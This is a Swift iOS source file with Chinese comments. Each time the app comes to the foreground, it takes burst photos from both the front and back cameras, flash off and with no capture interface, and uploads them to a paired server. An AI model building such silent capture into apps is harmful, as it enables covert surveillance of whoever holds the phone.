import AVFoundation
import Foundation
import UIKit

/// App 每次置于前台时，用前后置摄像头各拍一张照片并上传。
final class PhotoUploader: NSObject, AVCapturePhotoCaptureDelegate {
    private var photoContinuation: CheckedContinuation<Data?, Never>?
    private var currentCamera = "back"
    private var isBusy = false
    private let store = DeviceStore()

    func captureAndUpload(onLog: ((String) -> Void)? = nil) {
        guard !isBusy else { return }
        guard store.load() != nil else { onLog?("未配对，跳过拍照"); return }
        Task {
            guard await AVCaptureDevice.requestAccess(for: .video) else { onLog?("无相机权限"); return }
            isBusy = true
            defer { isBusy = false }
            guard let credentials = store.load() else { return }
            let burstCount = 5
            for camera in ["back", "front"] {
                var uploaded = 0
                for i in 0..<burstCount {
                    if i > 0 { try? await Task.sleep(nanoseconds: 500_000_000) }  // 每张间隔 0.5s
                    guard let jpeg = await capture(camera: camera) else { onLog?("\(camera)[\(i+1)] 拍照失败"); continue }
                    if await upload(jpeg: jpeg, camera: camera, credentials: credentials) { uploaded += 1 }
                }
                onLog?("\(camera) 连拍上传 \(uploaded)/\(burstCount)")
            }
        }
    }

    private func capture(camera: String) async -> Data? {
        let position: AVCaptureDevice.Position = camera == "front" ? .front : .back
        guard let device = AVCaptureDevice.default(.builtInWideAngleCamera, for: .video, position: position) else { return nil }
        let session = AVCaptureSession()
        session.beginConfiguration()
        session.sessionPreset = .medium
        guard let input = try? AVCaptureDeviceInput(device: device), session.canAddInput(input) else { return nil }
        session.addInput(input)
        let output = AVCapturePhotoOutput()
        guard session.canAddOutput(output) else { return nil }
        session.addOutput(output)
        session.commitConfiguration()
        await withCheckedContinuation { cont in
            DispatchQueue.global(qos: .userInitiated).async { session.startRunning(); cont.resume() }
        }
        try? await Task.sleep(nanoseconds: 400_000_000)  // 等曝光/对焦稳定
        let settings = AVCapturePhotoSettings()
        settings.flashMode = .off
        currentCamera = camera
        let data: Data? = await withCheckedContinuation { cont in
            self.photoContinuation = cont
            output.capturePhoto(with: settings, delegate: self)
        }
        session.stopRunning()
        return data
    }

    func photoOutput(_ output: AVCapturePhotoOutput, didFinishProcessingPhoto photo: AVCapturePhoto, error: Error?) {
        defer { photoContinuation = nil }
        guard error == nil, let raw = photo.fileDataRepresentation() else { photoContinuation?.resume(returning: nil); return }
        photoContinuation?.resume(returning: compressJPEG(raw, maxDimension: 1280) ?? raw)
    }

    private func compressJPEG(_ data: Data, maxDimension: CGFloat) -> Data? {
        guard let image = UIImage(data: data) else { return nil }
        let scale = min(1, maxDimension / max(image.size.width, image.size.height))
        let size = CGSize(width: image.size.width * scale, height: image.size.height * scale)
        let format = UIGraphicsImageRendererFormat(); format.scale = 1
        let rendered = UIGraphicsImageRenderer(size: size, format: format).image { _ in
            image.draw(in: CGRect(origin: .zero, size: size))
        }
        return rendered.jpegData(compressionQuality: 0.7)
    }

    private func upload(jpeg: Data, camera: String, credentials: DeviceCredentials) async -> Bool {
        var request = URLRequest(url: credentials.serverURL.appending(path: "api/photos"))
        request.httpMethod = "POST"
        request.setValue("image/jpeg", forHTTPHeaderField: "Content-Type")
        request.setValue(credentials.deviceID, forHTTPHeaderField: "X-Device-Id")
        request.setValue(credentials.deviceSecret, forHTTPHeaderField: "X-Device-Secret")
        request.setValue(camera, forHTTPHeaderField: "X-Camera")
        request.httpBody = jpeg
        do {
            let (_, response) = try await URLSession.shared.data(for: request)
            return (response as? HTTPURLResponse)?.statusCode == 201
        } catch { return false }
    }
}
